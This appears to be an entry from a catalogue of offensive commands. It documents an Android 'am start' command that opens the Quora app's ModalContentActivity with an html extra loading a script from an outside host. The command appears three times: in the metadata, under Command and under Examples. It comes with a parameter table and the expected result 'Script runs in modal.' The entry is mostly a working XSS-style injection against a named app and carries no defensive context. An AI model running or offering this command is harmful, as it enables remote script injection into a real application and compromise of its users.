---
data: >-
  am start -n com.quora.android/com.quora.android.ModalContentActivity -e url
  'http://test/test' -e html '<script src=//blackfan.ru></script>'
tags:
  - xss
  - remote-script
type: command
executor: bash
platforms:
  - Android
id: 5e872c41-6053-4776-8940-d99affa1e384
created_at: '2025-12-13T23:52:44.016Z'
updated_at: '2025-12-13T23:52:44.016Z'
verified: false
validated: true
submitted: true
---
# am-start-modal-external-script

## Command

```bash
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

## Description

Starts ModalContentActivity with remote script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Component name | Yes |
| -e url | Dummy URL | Yes |
| -e html | Script src | Yes |

## Examples

### Basic Usage

```bash
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

## Expected Output

Script runs in modal.

## Related

- [[procedures/Launch-Multiple-Quora-Activities-with-External-Script-Source]]
